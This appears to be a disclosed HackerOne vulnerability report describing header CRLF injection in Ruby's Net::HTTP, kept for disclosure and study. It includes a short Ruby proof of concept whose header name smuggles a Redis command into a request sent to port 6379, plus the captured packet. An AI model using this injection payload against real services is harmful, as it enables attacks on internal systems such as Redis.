---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1718757'
original_report_id: '1718757'
title: Header CRLF Injection in Ruby Net::HTTP
weakness: CRLF Injection
team_handle: ruby
created_at: '2022-10-01T02:12:04.267Z'
disclosed_at: '2023-05-04T01:40:31.030Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 4
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- crlf-injection
---

# Header CRLF Injection in Ruby Net::HTTP

## Metadata

- HackerOne Report ID: 1718757
- Weakness: CRLF Injection
- Program: ruby
- Disclosed At: 2023-05-04T01:40:31.030Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

There is a Header CRLF Injection vulnerability in Ruby Net::HTTP.
When I run the following code:
```
require 'net/http'

http = Net::HTTP.new('127.0.0.1', 6379)
headers = {
  "test\r\nSET VULN POC \r\n" => "test",
}
resp, data = http.get("/", headers)
```
The service on port 6379 will receive the following packet:
```
GET / HTTP/1.1
Test
set vuln poc
: test
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Connection: close
Host: 127.0.0.1:6379
```
This means that if an attacker can control the header name, he can inject arbitrary content into the HTTP request. This is very dangerous.

## Impact

If port 6379 is running the Redis service, the attacker can directly execute the Redis command. So this vulnerability can be used to attack internal services like Redis etc.
{F1963847}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
